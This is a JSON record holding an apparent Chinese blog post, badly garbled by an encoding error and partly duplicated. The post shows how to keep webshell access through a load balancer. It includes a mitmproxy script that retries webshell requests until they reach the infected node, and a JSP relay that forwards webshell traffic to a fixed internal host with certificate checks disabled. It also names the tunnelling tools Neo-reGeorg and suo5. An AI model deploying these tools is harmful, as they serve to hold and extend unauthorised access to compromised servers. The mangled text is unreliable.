        "content": "è´Ÿè½½å‡è¡¡åœºæ™¯çš„webshellè¿æ¥ äº‹æƒ…èµ·æºäºdacongå¸ˆå‚…é—®æˆ‘ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘æ²¡ç­”ä¸Šæ¥ï¼Œå¤§è‡´æ˜¯è¿™æ ·çš„ï¼š\nQï¼šç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œå‘½ä»¤æ‰§è¡Œip aè¿”å›çš„åœ°å€éƒ½ä¸ä¸€æ ·ï¼Œèƒ½å†™webshellï¼Œä½†æ‰§è¡Œä¸€ä¸ªå‘½ä»¤åæ¬¡åªæœ‰ä¸€æ¬¡æˆåŠŸäº†ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¦‚ä½•ç»•è¿‡\nAï¼šè¿™æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå«åšè´Ÿè½½å‡è¡¡ï¼Œä½ çš„å‘½ä»¤ä¼šè°ƒåº¦åˆ°å…¶ä»–çš„æœºå™¨ä¸Šæ‰§è¡Œï¼Œè°ƒåº¦å™¨æ ¹æ®è´Ÿè½½éšæœºè°ƒåº¦æ‰§è¡Œï¼Œè¿™ç§æƒ…å†µå°±ä¼šå¯¼è‡´ä½ ä»£ç†åšä¸èµ·æ¥ï¼Œè€Œä¸”æ–‡ä»¶ä¼ ä¸Šå»ä¹Ÿä¸å®Œæ•´\u0026hellip;\näºæ˜¯ä¹ï¼Œè¯¦ç»†å­¦ä¹ ä¸€ä¸‹é’ˆå¯¹è¿™ç§åœºæ™¯æ€ä¹ˆè¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨\nè´Ÿè½½å‡è¡¡æ¦‚å¿µ åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä¸ªäººå¯¹cdnå’Œè´Ÿè½½å‡è¡¡ä¸¤ä¸ªæ¦‚å¿µæœ‰ç‚¹å«ç³Šï¼Œè¿™é‡Œç‰¹æ„äº†è§£å¹¶åŒºåˆ†ä¸€ä¸‹ï¼š\nCDN æ˜¯ä¸€å¼ åˆ†å¸ƒå¼ç¼“å­˜ç½‘ç»œï¼ŒæŠŠæºç«™çš„å†…å®¹ï¼ˆé€šå¸¸æ˜¯é™æ€èµ„æºï¼‰æå‰ç¼“å­˜åˆ°å…¨çƒå„åœ°çš„è¾¹ç¼˜èŠ‚ç‚¹ä¸Š è´Ÿè½½å‡è¡¡æ˜¯ä¸€ä¸ªè¯·æ±‚åˆ†å‘å™¨ï¼ŒæŠŠè¯·æ±‚æŒ‰ç­–ç•¥åˆ†å‘ç»™å¤šä¸ªåç«¯æœåŠ¡å™¨ï¼Œé¿å…æŸä¸€å°è¿‡è½½ è¯¦ç»†è®²è®²è´Ÿè½½å‡è¡¡ï¼š\nä¸Šé¢æåˆ°äº†ï¼Œè´Ÿè½½å‡è¡¡é€šå¸¸ç”¨äºå°†æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚åˆ†å‘åˆ°å¤šå° Web æœåŠ¡å™¨ï¼Œè¿™å¯ä»¥æé«˜ç½‘ç«™çš„æ€§èƒ½å’Œå“åº”é€Ÿåº¦ï¼Œå¹¶ç¡®ä¿å³ä½¿åœ¨é«˜æµé‡æƒ…å†µä¸‹ä¹Ÿèƒ½ä¿æŒæ­£å¸¸è¿è¡Œï¼Œä»¥Nginxè´Ÿè½½å‡è¡¡ä¸ºä¾‹ï¼Œå¤§æ¦‚å¯ä»¥æè¿°ä¸ºï¼š\ngraph TD A[ç”¨æˆ·è®¾å¤‡] --\u003e B[Nginxè´Ÿè½½å‡è¡¡å™¨] B --\u003e C[æœåŠ¡å™¨1] B --\u003e D[æœåŠ¡å™¨2] B --\u003e E[æœåŠ¡å™¨3] æˆ‘ä»¬è®¿é—®çš„è¯·æ±‚æ˜¯é€šè¿‡nginxè½¬å‘è¿‡å»çš„ï¼Œè¯·æ±‚çš„å®é™…å¤„ç†ï¼Œnginxä¼šé»˜è®¤å¯¹è´Ÿè½½èŠ‚ç‚¹è¿›è¡Œè½®è¯¢è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¯·æ±‚ä¸€ä¼šå‘é€ç»™æœåŠ¡å™¨1ï¼Œä¸€ä¼šå‘é€ç»™æœåŠ¡å™¨2\né‚£ä¹ˆåœ¨æ”»å‡»è§†è§’ä¸‹ï¼Œè´Ÿè½½å‡è¡¡çš„ç‰¹å¾ä¾¿å’Œä¸Šé¢å¸ˆå‚…é‚£ä¸ªé—®é¢˜ä¸€æ ·äº†ï¼š\nåœ¨å°è¯•å†™webshellåï¼Œè®¿é—®æˆ‘ä»¬å†™çš„webshellï¼ŒçŠ¶æ€ç ä¸€ä¼šä¸º200ï¼Œä¸€ä¼šä¸º404\næ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°æŸ¥è¯¢åˆ°çš„å†…ç½‘ipä¸€ç›´åœ¨å˜åŒ–\næˆ‘ä»¬æŸ¥çœ‹ç›®å½•æ–‡ä»¶æ—¶ï¼Œå‘ç°åˆ·æ–°ä¸€æ¬¡ï¼Œç›®å½•å°±å‘ç”Ÿå˜åŒ–äº†\næƒ…å†µåˆ†ç±» å…¶å®ä»”ç»†æ€è€ƒä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œç”±äºè´Ÿè½½å‡è¡¡æ˜¯å°†è¯·æ±‚è½®è¯¢è½¬å‘åˆ°è´Ÿè½½èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå¦‚æœç½‘ç«™å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œé‚£ä¹ˆæ–‡ä»¶å²‚ä¸æ˜¯åªå­˜æ”¾åˆ°äº†ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Ÿé’ˆå¯¹ä¸Šä¼ æ–‡ä»¶è¿™ä¸ªåŠŸèƒ½ç‚¹æ¥çœ‹ï¼Œè¿™é‡Œå°±æœ‰äº†è´Ÿè½½å‡è¡¡çš„å‡ ç§æƒ…å†µ\næœªåšæ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡ å¦‚æœç½‘ç«™æœ‰ä¸Šä¼ åŠŸèƒ½ç‚¹è¿˜èƒ½é…ç½®æˆè¿™æ ·é‚£è¿ç»´æ˜¯è¿™ä¸ªğŸ‘\nåœ¨æœªè¿›è¡Œæ–‡ä»¶åŒæ­¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„webshellå°±åªå­˜åœ¨äºä¸€ä¸ªè´Ÿè½½èŠ‚ç‚¹\nåšäº†æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡ ç›¸åï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šåŒæ­¥åˆ°æ‰€æœ‰è´Ÿè½½å‡è¡¡èŠ‚ç‚¹\nå­˜åœ¨ç‹¬ç«‹å­˜å‚¨çš„è´Ÿè½½å‡è¡¡ ç®€å•ç†è§£ï¼Œå³èŠ‚ç‚¹ä¸å­˜å‚¨æ–‡ä»¶ï¼Œä¸Šä¼ åç›´æ¥è½¬å‘åˆ°ç‹¬ç«‹çš„å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼ˆå¦‚ä¸ƒç‰›äº‘ã€é˜¿é‡Œäº‘OSSï¼‰ï¼ŒèŠ‚ç‚¹ä»…å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œè¿™ç§æƒ…å†µä¸Šä¼ webshellå·²ç»å¾ˆéš¾è¢«è§£æäº†ï¼Œæ‰€ä»¥ä¸‹æ–‡æš‚ä¸è®¨è®ºè¯¥æƒ…å†µ\næ”»å‡»è§†è§’ä¸‹çš„éš¾ç‚¹ 1.ä¸Šwebshell é¦–å…ˆï¼Œä¸Šwebshellæ—¶ï¼Œè¯·æ±‚ä¼šåªè½¬å‘åˆ°ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œå¦‚æœï¼Œé‚£ä¹ˆåœ¨å°è¯•è¿æ¥webshellåå°±ä¼šå¯¼è‡´ä¸€ä¼šæˆåŠŸä¸€ä¼šå¤±è´¥ï¼Œè¯·æ±‚ä¸ä¸€å®šèƒ½è½®è¯¢åˆ°æœ‰webshellçš„èŠ‚ç‚¹\n2.å‘½ä»¤æ‰§è¡Œ åœ¨æ‹¿shellåæˆ–è€…æˆåŠŸç»™æ¯ä¸ªèŠ‚ç‚¹éƒ½å†™äº†webshellåï¼Œæˆ‘ä»¬æ— æ³•åˆ¤æ–­æ‰§è¡Œçš„å‘½ä»¤ä¼ åˆ°äº†å“ªä¸ªåç«¯æœåŠ¡å™¨ï¼Œå³å‰é¢æåˆ°çš„ip aç»“æœä¸€ç›´å˜åŒ–\n3.å¤§æ–‡ä»¶ä¸Šä¼  ä»¥èšå‰‘ä¸ºä¾‹ï¼Œä¸Šä¼ å¤§æ–‡ä»¶æ˜¯åˆ†å—ä¼ è¾“ï¼Œé‚£ä¹ˆåŒç†ï¼Œåˆ†å—åå¯èƒ½å·¥å…·åœ¨ä¼—å¤šåç«¯æœåŠ¡å™¨ä¸­å°±æ˜¯ä¸œä¸€å—è¥¿ä¸€å—äº†\n4.éš§é“ä»£ç† è‹¥æœºå™¨ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬ä¾¿éœ€è¦åšéš§é“ä»£ç†ï¼Œä½†åœ¨è¿™ç§åœºæ™¯å¾ˆæ˜æ˜¾æ²¡åŠæ³•æ­£å¸¸æ­å»ºéš§é“\nè§£å†³æ–¹æ³• æ— æ–‡ä»¶åŒæ­¥çš„è§£å†³æ–¹æ¡ˆ ç®€å•æ¥æ€è€ƒï¼Œå¤§å®¶ä¸éš¾æƒ³åˆ°ï¼šä¸€ç›´è¯·æ±‚webshellç›´åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¸ºæ­¢ï¼Œä½†è¿™æ ·æœ‰ç‚¹ä¸å¤ªè‡ªåŠ¨äº†ï¼ŒCxySecå¸ˆå‚…æå‡ºäº†ä¸€ç§è¾ƒä¸ºæ–¹ä¾¿çš„åŠæ³•ï¼Œé‚£å°±æ˜¯mitmproxyï¼š\nfrom mitmproxy import ctx, http import requests class ProxyAddon: def request(self, flow: http.HTTPFlow) -\u0026gt; None: # åªå¤„ç†POSTè¯·æ±‚ if flow.request.method == \u0026#34;POST\u0026#34;: url = self.get_https_url(flow.request.host, flow.request.path) # æ‰“å°è½¬å‘å‰çš„è¯·æ±‚å†…å®¹ print(\u0026#34;Original Request:\u0026#34;) print(flow.request.headers) print(flow.request.content.decode()) # å‘é€POSTè¯·æ±‚åˆ°ç›®æ ‡HTTPSæœåŠ¡å™¨ while True: try: response = self.make_https_request(url, flow.request.content) break except: continue while True: try: response = self.make_https_request(url, flow.request.content) if response.status_code != 404: break continue except: continue # æ‰“å°è½¬å‘åçš„å“åº”å†…å®¹ print(\u0026#34;Forwarded Response:\u0026#34;) print(response.headers) print(response.content.decode()) # å°†HTTPSå“åº”è¿”å›ç»™ç›‘å¬ headers = [(k.encode(\u0026#39;utf-8\u0026#39;), v.encode(\u0026#39;utf-8\u0026#39;)) for k, v in response.headers.items()] flow.response = http.Response.make( 200, response.content, headers ) def make_https_request(self, url, data): proxies = { \u0026#39;http\u0026#39;: \u0026#39;http://127.0.0.1:8080\u0026#39;, \u0026#39;https\u0026#39;: \u0026#39;https://127.0.0.1:8080\u0026#39; } # è‡ªå®šä¹‰è¶…æ—¶æ—¶é—´ä¸º10ç§’ response = requests.post(url, data=data, timeout=3, proxies=proxies, verify=False) return response def get_https_url(self, host, path): # æ ¹æ®éœ€è¦ä¿®æ”¹ä¸ºç›¸åº”çš„HTTPSåœ°å€ https_host = f\u0026#34;https://{host}\u0026#34; return f\u0026#34;{https_host}{path}\u0026#34; addons = [ ProxyAddon() ] å°†webshellè¿æ¥å·¥å…·ï¼ˆæ¯”å¦‚èšå‰‘ï¼‰è®¾ç½®ä»£ç†åˆ°è¯¥mitmproxyè„šæœ¬ä¸Šï¼Œè„šæœ¬ä¼šä¸»åŠ¨å¾ªç¯è½¬å‘è¯·æ±‚åˆ°ç›®æ ‡webshellä¸Šï¼Œç›´åˆ°æ­£ç¡®å“åº”ï¼Œå†å°†å“åº”è¿”å›ç»™webshellè¿æ¥å·¥å…·\næ³¨æ„äº‹é¡¹ï¼š\nè„šæœ¬è®¾ç½®äº†å“åº”404æ—¶ä¼šå¾ªç¯è¯·æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹çš„è€—æ—¶æ˜¯ä¸ç¡®å®šçš„ï¼Œé‚£ä¹ˆæœ€å¥½æ˜¯åœ¨webshellè¿æ¥å·¥å…·ä¸Šè®¾ç½®ä¸€ä¸‹è¶…æ—¶æ—¶é—´ è„šæœ¬é‡Œæœ‰httpè½¬httpsçš„æ“ä½œï¼Œå³æ—¶ç›®æ ‡urlæ˜¯httpsï¼Œä¹Ÿåªéœ€è¦åœ¨webshellè¿æ¥å·¥å…·ä¸­å¡«å†™http æœ‰æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡ è¿™ç§æƒ…å†µä¸‹webshellèƒ½å¤Ÿå§‹ç»ˆè¿æ¥æˆåŠŸï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¿è¯å‘½ä»¤å§‹ç»ˆéƒ½åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ‰§è¡Œ\nèšå‰‘ä½œè€…mediceanæä¾›äº†ä¸€ä¸ªæ€è·¯ï¼š\néœ€è¦è½åœ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯webshellï¼Œä¸€ä¸ªæ˜¯æµé‡è½¬å‘è„šæœ¬ï¼Œè¿™é‡Œç»™å‡ºäº†jspçš„è½¬å‘è„šæœ¬ï¼š\n\u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.net.ssl.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.ByteArrayOutputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.DataInputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.OutputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.HttpURLConnection\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URL\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.security.KeyManagementException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.security.NoSuchAlgorithmException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.security.cert.CertificateException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.security.cert.X509Certificate\u0026#34; %\u0026gt; \u0026lt;%! public static void ignoreSsl() throws Exception { HostnameVerifier hv = new HostnameVerifier() { public boolean verify(String urlHostName, SSLSession session) { return true; } }; trustAllHttpsCertificates(); HttpsURLConnection.setDefaultHostnameVerifier(hv); } private static void trustAllHttpsCertificates() throws Exception { TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() { public X509Certificate[] getAcceptedIssuers() { return null; } @Override public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException { // Not implemented } @Override public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException { // Not implemented } }}; try { SSLContext sc = SSLContext.getInstance(\u0026#34;TLS\u0026#34;); sc.init(null, trustAllCerts, new java.security.SecureRandom()); HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory()); } catch (KeyManagementException e) { e.printStackTrace(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;% String target = \u0026#34;http://172.24.0.2:8080/ant.jsp\u0026#34;; //å¡«å†™å†…ç½‘nodeçš„webshellåœ°å€ URL url = new URL(target); if (\u0026#34;https\u0026#34;.equalsIgnoreCase(url.getProtocol())) { ignoreSsl(); } HttpURLConnection conn = (HttpURLConnection) url.openConnection(); StringBuilder sb = new StringBuilder(); conn.setRequestMethod(request.getMethod()); conn.setConnectTimeout(30000); conn.setDoOutput(true); conn.setDoInput(true); conn.setInstanceFollowRedirects(false); conn.connect(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); OutputStream out2 = conn.getOutputStream(); DataInputStream in = new DataInputStream(request.getInputStream()); byte[] buf = new byte[1024]; int len = 0; while ((len = in.read(buf)) != -1) { baos.write(buf, 0, len); } baos.flush(); baos.writeTo(out2); baos.close(); InputStream inputStream = conn.getInputStream(); OutputStream out3 = response.getOutputStream(); int len2 = 0; while ((len2 = inputStream.read(buf)) != -1) { out3.write(buf, 0, len2); } out3.flush(); out3.close(); %\u0026gt; è„šæœ¬å¤§æ¦‚ä½œç”¨å°±æ˜¯å°†å‘è¿™ä¸ªè½¬å‘è„šæœ¬å‘é€çš„è¯·æ±‚è½¬å‘åˆ°å†…ç½‘ä¸­å›ºå®šçš„nodeä¸Šï¼Œç±»ä¼¼ä¸€ä¸ªhttpä»£ç†ï¼Œå¦‚ä¸‹å›¾ï¼š\né‚£ä¹ˆè¿™ä¸ªæ‰‹æ³•çš„å¤§è‡´æ€è·¯å°±æ˜¯å…ˆåœ¨æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¸Šä¼ webshellå¹¶è·å–è¯¥èŠ‚ç‚¹ç‰¹å¾ï¼ˆipæˆ–æ–‡ä»¶ï¼‰ï¼Œå†æ ¹æ®å¾—åˆ°çš„ç‰¹å¾ç¼–å†™mitmè½¬å‘è„šæœ¬ï¼Œä½†è¿™ä¸ªæ–¹æ¡ˆçš„å‰ææ˜¯å†…ç½‘çš„èŠ‚ç‚¹ä¹‹é—´èƒ½å¤Ÿäº’é€š\nä»£ç†è§£å†³ ä¸»æ’­ä¸»æ’­ï¼Œä¸Šé¢çš„æ“ä½œå“¦è¿˜æ˜¯å¤ªåƒæ“ä½œäº†ï¼Œè¿äº†webshellè¿˜è¦æ€è€ƒæ€ä¹ˆåšä»£ç†ï¼Œæœ‰æ²¡æœ‰æ›´ç®€å•åˆå¼ºåŠ¿çš„æ–¹æ³•æ¨èä¸€ä¸‹\næœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ï¼ŒåŸºäºwebshellçš„httpä»£ç†äº†è§£ä¸€ä¸‹\nåœ¨ä¸Šé¢æˆ‘ä»¬æåˆ°äº†webshell+httpä»£ç†è½¬å‘è„šæœ¬çš„è§£å†³æ–¹æ¡ˆï¼Œè€ŒåŸºäºwebshellçš„httpä»£ç†ä¾¿æ˜¯å°†ä¸¤è€…ç»“åˆï¼Œæ›´åŠ é«˜æ•ˆï¼Œå¸¸ç”¨çš„ä¸¤ä¸ªä»£ç†æ˜¯neo-regeorgå’Œsuo5ï¼Œå¯ä»¥çœ‹çœ‹å®ƒä»¬çš„ä»‹ç»ï¼š\nNeo-regeorg:\nsuo5:\nå…·ä½“çš„ä½¿ç”¨å°±å»githubçœ‹readmeå§ï¼Œè¿™é‡Œä¸åšèµ˜è¿°äº†\n",
        "summary": "è´Ÿè½½å‡è¡¡åœºæ™¯çš„webshellè¿æ¥ äº‹æƒ…èµ·æºäºdacongå¸ˆå‚…é—®æˆ‘ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘æ²¡ç­”ä¸Šæ¥ï¼Œå¤§è‡´æ˜¯è¿™æ ·çš„ï¼š\nQï¼šç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œå‘½ä»¤æ‰§è¡Œip aè¿”å›çš„åœ°å€éƒ½ä¸ä¸€æ ·ï¼Œèƒ½å†™webshellï¼Œä½†æ‰§è¡Œä¸€ä¸ªå‘½ä»¤åæ¬¡åªæœ‰ä¸€æ¬¡æˆåŠŸäº†ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¦‚ä½•ç»•è¿‡\nAï¼šè¿™æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå«åšè´Ÿè½½å‡è¡¡ï¼Œä½ çš„å‘½ä»¤ä¼šè°ƒåº¦åˆ°å…¶ä»–çš„æœºå™¨ä¸Šæ‰§è¡Œï¼Œè°ƒåº¦å™¨æ ¹æ®è´Ÿè½½éšæœºè°ƒåº¦æ‰§è¡Œï¼Œè¿™ç§æƒ…å†µå°±ä¼šå¯¼è‡´ä½ ä»£ç†åšä¸èµ·æ¥ï¼Œè€Œä¸”æ–‡ä»¶ä¼ ä¸Šå»ä¹Ÿä¸å®Œæ•´\u0026hellip;\näºæ˜¯ä¹ï¼Œè¯¦ç»†å­¦ä¹ ä¸€ä¸‹é’ˆå¯¹è¿™ç§åœºæ™¯æ€ä¹ˆè¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨\nè´Ÿè½½å‡è¡¡æ¦‚å¿µ åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä¸ªäººå¯¹cdnå’Œè´Ÿè½½å‡è¡¡ä¸¤ä¸ªæ¦‚å¿µæœ‰ç‚¹å«ç³Šï¼Œè¿™é‡Œç‰¹æ„äº†è§£å¹¶åŒºåˆ†ä¸€ä¸‹ï¼š\nCDN æ˜¯ä¸€å¼ åˆ†å¸ƒå¼ç¼“å­˜ç½‘ç»œï¼ŒæŠŠæºç«™çš„å†…å®¹ï¼ˆé€šå¸¸æ˜¯é™æ€èµ„æºï¼‰æå‰ç¼“å­˜åˆ°å…¨çƒå„åœ°çš„è¾¹ç¼˜èŠ‚ç‚¹ä¸Š è´Ÿè½½å‡è¡¡æ˜¯ä¸€ä¸ªè¯·æ±‚åˆ†å‘å™¨ï¼ŒæŠŠè¯·æ±‚æŒ‰ç­–ç•¥åˆ†å‘ç»™å¤šä¸ªåç«¯æœåŠ¡å™¨ï¼Œé¿å…æŸä¸€å°è¿‡è½½ è¯¦ç»†è®²è®²è´Ÿè½½å‡è¡¡ï¼š\nä¸Šé¢æåˆ°äº†ï¼Œè´Ÿè½½å‡è¡¡é€šå¸¸ç”¨äºå°†æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚åˆ†å‘åˆ°å¤šå° Web æœåŠ¡å™¨ï¼Œè¿™å¯ä»¥æé«˜ç½‘ç«™çš„æ€§èƒ½å’Œå“åº”é€Ÿåº¦ï¼Œå¹¶ç¡®ä¿å³ä½¿åœ¨é«˜æµé‡æƒ…å†µä¸‹ä¹Ÿèƒ½ä¿æŒæ­£å¸¸è¿è¡Œï¼Œä»¥Nginxè´Ÿè½½å‡è¡¡ä¸ºä¾‹ï¼Œå¤§æ¦‚å¯ä»¥æè¿°ä¸ºï¼š\ngraph TD A[ç”¨æˆ·è®¾å¤‡] --\u003e B[Nginxè´Ÿè½½å‡è¡¡å™¨] B --\u003e C[æœåŠ¡å™¨1] B --\u003e D[æœåŠ¡å™¨2] B --\u003e E[æœåŠ¡å™¨3] æˆ‘ä»¬è®¿é—®çš„è¯·æ±‚æ˜¯é€šè¿‡nginxè½¬å‘è¿‡å»çš„ï¼Œè¯·æ±‚çš„å®é™…å¤„ç†ï¼Œnginxä¼šé»˜è®¤å¯¹è´Ÿè½½èŠ‚ç‚¹è¿›è¡Œè½®è¯¢è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¯·æ±‚ä¸€ä¼šå‘é€ç»™æœåŠ¡å™¨1ï¼Œä¸€ä¼šå‘é€ç»™æœåŠ¡å™¨2\né‚£ä¹ˆåœ¨æ”»å‡»è§†è§’ä¸‹ï¼Œè´Ÿè½½å‡è¡¡çš„ç‰¹å¾ä¾¿å’Œä¸Šé¢å¸ˆå‚…é‚£ä¸ªé—®é¢˜ä¸€æ ·äº†ï¼š\nåœ¨å°è¯•å†™webshellåï¼Œè®¿é—®æˆ‘ä»¬å†™çš„webshellï¼ŒçŠ¶æ€ç ä¸€ä¼šä¸º200ï¼Œä¸€ä¼šä¸º404\næ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°æŸ¥è¯¢åˆ°çš„å†…ç½‘ipä¸€ç›´åœ¨å˜åŒ–\næˆ‘ä»¬æŸ¥çœ‹ç›®å½•æ–‡ä»¶æ—¶ï¼Œå‘ç°åˆ·æ–°ä¸€æ¬¡ï¼Œç›®å½•å°±å‘ç”Ÿå˜åŒ–äº†\næƒ…å†µåˆ†ç±» å…¶å®ä»”ç»†æ€è€ƒä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œç”±äºè´Ÿè½½å‡è¡¡æ˜¯å°†è¯·æ±‚è½®è¯¢è½¬å‘åˆ°è´Ÿè½½èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå¦‚æœç½‘ç«™å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œé‚£ä¹ˆæ–‡ä»¶å²‚ä¸æ˜¯åªå­˜æ”¾åˆ°äº†ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Ÿé’ˆå¯¹ä¸Šä¼ æ–‡ä»¶è¿™ä¸ªåŠŸèƒ½ç‚¹æ¥çœ‹ï¼Œè¿™é‡Œå°±æœ‰äº†è´Ÿè½½å‡è¡¡çš„å‡ ç§æƒ…å†µ\næœªåšæ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡ å¦‚æœç½‘ç«™æœ‰ä¸Šä¼ åŠŸèƒ½ç‚¹è¿˜èƒ½é…ç½®æˆè¿™æ ·é‚£è¿ç»´æ˜¯è¿™ä¸ªğŸ‘\nåœ¨æœªè¿›è¡Œæ–‡ä»¶åŒæ­¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„webshellå°±åªå­˜åœ¨äºä¸€ä¸ªè´Ÿè½½èŠ‚ç‚¹\nåšäº†æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡ ç›¸åï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šåŒæ­¥åˆ°æ‰€æœ‰è´Ÿè½½å‡è¡¡èŠ‚ç‚¹\nå­˜åœ¨ç‹¬ç«‹å­˜å‚¨çš„è´Ÿè½½å‡è¡¡ ç®€å•ç†è§£ï¼Œå³èŠ‚ç‚¹ä¸å­˜å‚¨æ–‡ä»¶ï¼Œä¸Šä¼ åç›´æ¥è½¬å‘åˆ°ç‹¬ç«‹çš„å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼ˆå¦‚ä¸ƒç‰›äº‘ã€é˜¿é‡Œäº‘OSSï¼‰ï¼ŒèŠ‚ç‚¹ä»…å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œè¿™ç§æƒ…å†µä¸Šä¼ webshellå·²ç»å¾ˆéš¾è¢«è§£æäº†ï¼Œæ‰€ä»¥ä¸‹æ–‡æš‚ä¸è®¨è®ºè¯¥æƒ…å†µ\næ”»å‡»è§†è§’ä¸‹çš„éš¾ç‚¹ 1.ä¸Šwebshell é¦–å…ˆï¼Œä¸Šwebshellæ—¶ï¼Œè¯·æ±‚ä¼šåªè½¬å‘åˆ°ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œå¦‚æœï¼Œé‚£ä¹ˆåœ¨å°è¯•è¿æ¥webshellåå°±ä¼šå¯¼è‡´ä¸€ä¼šæˆåŠŸä¸€ä¼šå¤±è´¥ï¼Œè¯·æ±‚ä¸ä¸€å®šèƒ½è½®è¯¢åˆ°æœ‰webshellçš„èŠ‚ç‚¹\n2.å‘½ä»¤æ‰§è¡Œ åœ¨æ‹¿shellåæˆ–è€…æˆåŠŸç»™æ¯ä¸ªèŠ‚ç‚¹éƒ½å†™äº†webshellåï¼Œæˆ‘ä»¬æ— æ³•åˆ¤æ–­æ‰§è¡Œçš„å‘½ä»¤ä¼ åˆ°äº†å“ªä¸ªåç«¯æœåŠ¡å™¨ï¼Œå³å‰é¢æåˆ°çš„ip aç»“æœä¸€ç›´å˜åŒ–\n3.å¤§æ–‡ä»¶ä¸Šä¼  ä»¥èšå‰‘ä¸ºä¾‹ï¼Œä¸Šä¼ å¤§æ–‡ä»¶æ˜¯åˆ†å—ä¼ è¾“ï¼Œé‚£ä¹ˆåŒç†ï¼Œåˆ†å—åå¯èƒ½å·¥å…·åœ¨ä¼—å¤šåç«¯æœåŠ¡å™¨ä¸­å°±æ˜¯ä¸œä¸€å—è¥¿ä¸€å—äº†\n4.éš§é“ä»£ç† è‹¥æœºå™¨ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬ä¾¿éœ€è¦åšéš§é“ä»£ç†ï¼Œä½†åœ¨è¿™ç§åœºæ™¯å¾ˆæ˜æ˜¾æ²¡åŠæ³•æ­£å¸¸æ­å»ºéš§é“\nè§£å†³æ–¹æ³• æ— æ–‡ä»¶åŒæ­¥çš„è§£å†³æ–¹æ¡ˆ ç®€å•æ¥æ€è€ƒï¼Œå¤§å®¶ä¸éš¾æƒ³åˆ°ï¼šä¸€ç›´è¯·æ±‚webshellç›´åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¸ºæ­¢ï¼Œä½†è¿™æ ·æœ‰ç‚¹ä¸å¤ªè‡ªåŠ¨äº†ï¼ŒCxySecå¸ˆå‚…æå‡ºäº†ä¸€ç§è¾ƒä¸ºæ–¹ä¾¿çš„åŠæ³•ï¼Œé‚£å°±æ˜¯mitmproxyï¼š\nfrom mitmproxy import ctx, http import requests class ProxyAddon: def request(self, flow: http.HTTPFlow) -\u0026gt; None: # åªå¤„ç†POSTè¯·æ±‚ if flow.request.method == \u0026#34;POST\u0026#34;: url = 